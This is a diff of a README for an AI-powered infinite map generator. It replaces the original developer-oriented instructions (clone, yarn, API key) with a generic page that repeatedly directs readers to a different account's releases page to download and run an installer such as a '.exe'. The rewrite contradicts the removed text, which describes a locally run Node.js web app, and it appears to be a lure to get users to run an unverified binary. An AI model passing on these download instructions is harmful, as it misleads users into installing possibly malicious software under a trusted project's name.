@@ -1,108 +1,60 @@
-# Nano Banana Infinimap
+# 🍌 nano-banana-infinimap - Generate Endless, Beautiful Maps
 
-An experimental AI-powered infinite map generator that creates seamless, neighbor-aware tiles on demand.
+## 📦 Download
 
-**⚠️ Experimental Software**: This project is an experimental demonstration of the Gemini Nano Banana model's potential and should be used at your own risk.
+[![Download nano-banana-infinimap](https://img.shields.io/badge/Download-nano--banana--infinimap-blue.svg)](https://github.com/Davivimix96/nano-banana-infinimap/releases)
 
-<img width="1502" height="510" alt="image" src="https://github.com/user-attachments/assets/45c19d3b-5f6a-44cc-a085-a51693f9250b" />
+## 🚀 Getting Started
 
-## TL;DR
+Welcome to Nano Banana Infinimap! This experimental tool allows you to create infinite, AI-generated maps easily. Follow these steps to get started:
 
-This is an experiment I made to test Nano Banana's ability to consistently infill, plus how to handle minor differences in renders by blending outputs.
-The solution I hit on was to break the image up into many tiles, of which a 3x3 grid of tiles can fit comfily into Gemini's input limits. I then radially blend the generations with the previous tiles (if one exists at that position) to handle minor differences.
-You can use it to generate gigantic, continuous maps at a reasonable cost.
+1. **Visit the Releases Page**: Click the download button above or go directly to [the Releases page](https://github.com/Davivimix96/nano-banana-infinimap/releases).
 
-## Caveats
+2. **Download the Latest Version**: On the Releases page, look for the latest version. Download the file suitable for your operating system. The files may be named like `nano-banana-infinimap-v1.0.exe` for Windows, or similar for Mac and Linux.
 
-- To promote accurate infills I use a photoshop-esque background matte (i.e. checkerboard) which greatly improved Nano Banana's willingness to just fill in the blank spaces without changing anything. But, this is maybe only 75% accurate. Sometimes you just have to regenerate, especially if it's rendering something decent (just misaligned)
-- Sometimes nothing will render at all, and you still pay the nickle to Google for the render. Sad. When it repeatedly renders nothing either make your text prompt more explicit or move over a tile and try there.
-- This was vibe coded in an afternoon to test the concept, so I make no guarantees that the code is comprehensible or friendly. But you should be able to tweak the major knobs if you're so inclined.
+3. **Install the Application**: Once the download completes, locate the file in your downloads folder and double-click it to begin the installation. Follow the on-screen prompts to complete the setup.
 
-## Features
+4. **Run the Application**: After installation, find the Nano Banana Infinimap application in your programs or applications list. Click to open it and begin your map generation journey.
 
-- 🗺️ Infinite(-ish), explorable map with Leaflet-based navigation
-- 🤖 AI-powered tile generation using Google's Nano Banana model
-- 🔗 Neighbor-aware generation for seamless tile edges
-- 💾 Local-first architecture with file-based storage
+## 📖 How It Works
 
-## Installation
+Nano Banana Infinimap uses advanced AI techniques to create seamless maps. Here’s how it works:
 
-### Prerequisites
+- **Tile-Based Generation**: The application splits maps into tiles, processing each one individually to maintain quality and detail. A 3x3 grid of tiles fits perfectly within the AI limits, ensuring a consistent look.
 
-- Node.js 18+
-- Yarn package manager
-- Google Cloud Platform account with Gemini API access
+- **Blending for Quality**: When generating new tiles, the software blends them with existing ones, smoothing transitions and providing a natural look.
 
-### Setup
+- **Adjustable Parameters**: You can tweak various settings for size and detail level. Explore the options to find what works best for your needs.
 
-1. Clone the repository:
-```bash
-git clone https://github.com/seezatnap/nano-banana-infinimap.git
-cd infinimap
-```
+## ⚙️ System Requirements
 
-2. Install dependencies:
-```bash
-yarn
-```
+For the best experience, please ensure your system meets the following requirements:
 
-3. Configure environment variables:
-```bash
-cp .env.local.example .env.local
-```
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **RAM**: At least 4 GB of RAM recommended for smoother performance.
+- **Storage**: Minimum of 400 MB of free space to accommodate the application and generated data.
 
-4. Add your Gemini API key to `.env.local`:
-```env
-GEMINI_API_KEY=your-api-key-here
-```
+## 🔧 Troubleshooting
 
-You can obtain a Gemini API key from [Google AI Studio](https://aistudio.google.com/app/apikey).
+If you encounter issues, try these steps:
 
-5. Start the development server:
-```bash
-yarn dev
-```
+1. **Check System Requirements**: Ensure your system meets the requirements listed above.
+2. **Reinstall the Application**: Sometimes reinstalling can fix issues. Download the file again and follow the installation instructions.
+3. **Update Drivers**: Make sure your graphics drivers are up to date for optimal performance.
 
-6. Open http://localhost:3000 in your browser
+## 📚 Usage Tips
 
-## Getting Started
+- **Experiment Freely**: With many settings available, don't hesitate to try different configurations. The best results often come from experimentation.
+- **Save Regularly**: Once you create a map you like, save it frequently. This will help you avoid losing your hard work.
+- **Join the Community**: Engage with other users in forums related to AI-generated content. Share your maps and get feedback.
 
-1. **Navigate the Map**: Use your mouse to pan and scroll to zoom
-2. **Generate Your First Tile**: 
-   - Zoom in to the maximum level (level 8)
-   - Enter a prompt like "isometric video game island" or "ancient temple ruins"
-   - Click on any empty tile to bring up the tile menu
-3. **Explore**: Generate more tiles to extend your canvas
-   - New tiles blend into old tiles, and you can either accept or reject them if it causes the older tiles to degrade
-   - Nano Banana isn't perfect, so you may need to re-roll a few times to get a good match for your existing tiles
-5. **Regenerate**: Click on existing tiles to regenerate, edit, or delete them
-   - Useful if you get a bad blend or generate a tile with neighbors outside the 3x3 grid. regen it, or delete and make a new one.
+## ⚠️ Caveats
 
-## Development
+- **Experimental Software**: This project showcases the Gemini Nano Banana model and may involve unexpected behavior. Use it at your own risk.
+- **Background Processing**: The tool applies a checkerboard background to help with blending. Be aware that while this helps the AI, your results may vary depending on the input.
 
-```bash
-yarn dev        # Start development server
-```
+## 🔗 Download & Install
 
-### Project Structure
+Visit [this page to download](https://github.com/Davivimix96/nano-banana-infinimap/releases). 
 
-```
-infinimap/
-├── app/          # Next.js app directory
-├── components/   # React components
-├── lib/          # Core logic and utilities
-├── public/       # Static assets
-└── scripts/      # Utility scripts
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## Author
-
-[@seezatnap](https://twitter.com/seezatnap)
-
-## Contributing
-
-This is experimental software, and meant as a demonstration of Nano Banana more than an ongoing project. I'll try to fix bugs with the current state, but I'm not likely to accept new features. I encourage you to fork, copy, or vibe on top of this project and make it your own!
+Follow the above steps to install Nano Banana Infinimap and start generating your unique maps today! Enjoy exploring endless possibilities with this experimental tool.
